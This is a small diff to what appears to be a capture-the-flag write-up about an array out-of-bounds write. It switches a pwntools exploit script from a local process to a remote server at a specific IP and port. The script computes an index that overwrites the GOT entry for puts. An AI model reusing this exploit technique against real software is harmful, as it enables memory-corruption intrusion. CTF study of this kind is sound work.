@@ -176,7 +176,7 @@ It's clear that we can overwrite any value in the memory using that array out of
 ```python
 from pwn import *
 
-r = process('./oob')
+r = remote('34.71.207.70', 1337)
 elf = context.binary = ELF('./oob')
 
 r.sendline(str((elf.got['puts'] - elf.sym['arr'])//4))
